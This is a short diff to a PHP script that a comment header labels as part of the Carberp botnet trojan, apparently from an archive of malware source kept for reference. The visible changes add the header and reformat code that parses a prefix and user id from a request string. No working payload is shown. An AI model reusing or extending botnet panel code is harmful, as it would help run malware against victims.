@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 get_function('size_format');
 
@@ -6,9 +17,11 @@ $smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
 if(empty($Cur['str'])) exit;
 
 $matches = explode('0', $Cur['str'], 2);
-if(!empty($matches[0]) && !empty($matches[1])){	$prefix = $matches[0];
+if(!empty($matches[0]) && !empty($matches[1])){
+	$prefix = $matches[0];
 	$uid = '0' . $matches[1];
-}else{	exit;
+}else{
+	exit;
 }
 
 
